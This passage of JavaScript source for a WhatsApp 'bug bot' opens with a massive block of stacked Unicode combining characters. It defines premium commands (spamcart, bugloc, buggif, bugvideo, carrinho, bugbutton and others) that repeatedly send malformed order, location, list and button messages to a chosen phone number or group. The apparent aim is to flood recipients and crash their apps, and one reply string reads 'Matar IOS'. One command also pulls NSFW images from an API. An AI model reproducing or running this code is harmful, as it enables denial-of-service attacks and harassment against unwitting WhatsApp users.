ۣۣۣۣۣۣۣۣۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘཹ࿆  `,
"token": `ۣۣۣۣۣۣۣۜۜۜۜۜۜۜۜۜۜۜۜۜۜۢۢۢۢۢ ཹ࿆ۛۢۢۛۛۚۢۢۚۛۢۢۛۢۢۛۢۢۛۛۢۢۢۛۛۢۢۢۢۢۢۢۛۢۢۢ🤴ۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘཷ࿆ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘℂ⃨ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓐ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘℛۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ〬𝓞𝕊ۣۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓐⃨𝕋ۣۣۣۣۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓩ཷ࿆🤴ۣۣۣۣۣۣۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘཹ࿆  `,
"totalAmount1000": 999999,
"totalCurrencyCode": "IDR",
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < args[0]; i++) {
hisoka.relayMessage(m.chat, order.message, { messageId: order.key.id})
}
}
break

// KIRIM CART //
case 'spamcart': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
const order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": ``, // Change ID
"thumbnail": fs.readFileSync('./src/menu.jpg'), // Change the Image
"itemCount": `66666`, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": `${card}`, // Change the title
"message": `${card}`, // Change Message
"sellerJid": `37122219115@s.whatsapp.net`, // Change the seller
"token": `TheCarosatz`, // Change the token
"totalAmount1000": `66666`, // Change the Total Amount
"totalCurrencyCode": "IDR 66666", // Up to you
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < jumlah; i++) {
hisoka.relayMessage(`${numbers}@s.whatsapp.net`, order.message, { messageId: order.key.id})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break


case 'cart2': {
if (!isPremium) return m.reply(global.mess.premium)
const order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": ``, // Change ID
"thumbnail": fs.readFileSync('./src/menu.jpg'), // Change the Image
"itemCount": `666666`, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": `${card}`, // Change the title
"message": `${card}`, // Change Message
"sellerJid": `37122219115@s.whatsapp.net`, // Change the seller
"token": ``, // Change the token
"totalAmount1000": `666666666666`, // Change the Total Amount
"totalCurrencyCode": "IDR 666666666666", // Up to you
}
}), { userJid: hisoka.user.id })
hisoka.relayMessage(m.chat, order.message, { mentionedJid: `${jids}`, messageId: order.key.id})
}
break


// CART V2 //
/*case 'cart2': {
const order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": ``, // Change ID
"thumbnail": fs.readFileSync('./src/menu.jpg'), // Change the Image
"itemCount": `666666`, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": `${card}${card}`, // Change the title
"message": `${card}`, // Change Message
"sellerJid": `37122219115@s.whatsapp.net`, // Change the seller
"token": ``, // Change the token
"totalAmount1000": `666666666666`, // Change the Total Amount
"totalCurrencyCode": "IDR 666666666666", // Up to you
}
}), { userJid: hisoka.user.id })
hisoka.relayMessage(m.chat, order.message, { mentionedJid: `${jids}`, messageId: order.key.id})
}
break*/

// GABUT CASE //
case 'saya': {
if (!isPremium) return m.reply(global.mess.premium)
result = fs.readFileSync(`./src/audio.ogg`)
hisoka.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true, mentionedJid: `${jids}` }, { quoted: m })     
}
break

// TEXT BUTUH IOS //
case 'textios': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {text: `${iostext}`, mentionedJid: `${jids}`})
}
}
break

case 'buggif': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { video: fs.readFileSync('./src/pff.mp4'), caption: `${emojitrava}`, gifPlayback: true, contextInfo:{"externalAdReply": {"title": `By Carosatzx`,"body": ``, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync('./src/menu.jpg'),"sourceUrl": ``}}})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'webios': {
if (!isPremium) return m.reply(global.mess.premium)
hisoka.sendMessage(m.chat, { text: `Matar IOS`, contextInfo:{"externalAdReply": {"title": `${iostext}`,"body": `${emojitrava}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync('./src/menu.jpg'),"sourceUrl": ``}}})
}
break

case 'bugloc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
const location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
liveLocationMessage: {
                    caption: `${emojitrava}`,
                    jpegThumbnail: fs.readFileSync('./src/menu.jpg')
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < jumlah; i++) {
hisoka.relayMessage(`${numbers}@s.whatsapp.net`, location.message, { mentionedJid: `${jids}`, messageId: location.key.id}, { quoted: floc })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'buglocgc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
const location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
liveLocationMessage: {
                    caption: `${emojitrava}`,
                    jpegThumbnail: fs.readFileSync('./src/menu.jpg')
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < args[0]; i++) {
hisoka.relayMessage(m.chat, location.message, { mentionedJid: `${jids}`, messageId: location.key.id}, { quoted: floc })
}
}
break

case 'bugvideo': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { video: fs.readFileSync('./src/pff.mp4'), caption: `${emojitrava}`})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'animeneko': {
if (!isPremium) return m.reply(global.mess.premium)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next`}, type: 1},
        ]
      let buttonsNekoMessages = {
       image: {url:waifudd.data.url},
       caption:  `Ini Kak`,
      footer: `${global.cpowner}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            hisoka.sendMessage(m.chat, buttonsNekoMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
}
break

case 'bugbutton': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
let buttonsF = [
  {buttonId: `kkkkkku`, buttonText: {displayText: `${vbutton}`}, type: 1},
  {buttonId: `kkkkkku`, buttonText: {displayText: `${vbutton}`}, type: 1},
  {buttonId: `kkkkkku`, buttonText: {displayText: `${vbutton}`}, type: 1}
]
let buttonS = {
    text: `\n`,
    footer: vbutton,
    buttons: buttonsF,
    headerType: 1
    }
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, buttonS)
}
}
break




case 'carrinho': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
const list = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    "listMessage": {
      "title": `${card}`,
      "description": `${card}`,
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
              	"productId": "6431678466857362"
              },
               {
                "productId": "4120139628109348"
              },
               {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "Thumbnail": fs.readFileSync('./src/menu.jpg'),
          "jpegThumbnail": fs.readFileSync('./src/menu.jpg'),
        },
        "businessOwnerJid": `37122219115@s.whatsapp.net`,
      },
    }
  }), { userJid: hisoka.user.id })
  for (let i = 0; i < jumlah; i++) {
  hisoka.relayMessage(`${numbers}@s.whatsapp.net`, list.message, { mentionedJid: `${jids}`, messageId: list.key.id})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'carrinhogc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
const list = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    "listMessage": {
      "title": `${card}`,
      "description": `${card}`,
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
